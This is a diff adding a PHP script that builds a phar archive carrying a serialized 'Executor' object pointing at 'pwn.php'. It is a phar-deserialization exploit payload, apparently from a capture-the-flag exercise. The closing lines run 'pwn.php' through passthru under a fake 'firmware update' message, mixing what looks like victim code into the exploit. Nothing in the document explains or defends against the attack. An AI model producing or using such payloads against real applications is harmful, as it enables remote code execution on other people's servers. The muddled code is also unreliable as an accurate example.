@@ -1,0 +1,20 @@
+<?php
+	class Executor {
+		private $filename = "pwn.php"; 
+        private $signature = True;
+        private $init = false;
+	}
+
+	$phar = new Phar("test.phar");
+	$phar->startBuffering();
+	$phar->addFromString("test.txt", 'test');
+	$phar->setStub("<?php __HALT_COMPILER(); ?>");
+	$o = new Executor();
+	$phar->setMetadata($o);
+	$phar->stopBuffering();
+	
+	if(md5_file("pwn.php") == True){
+   		echo "Congratulations! Running firmware update: pwn.php <br>";
+   		passthru("php " . "pwn.php");
+	}
+?>
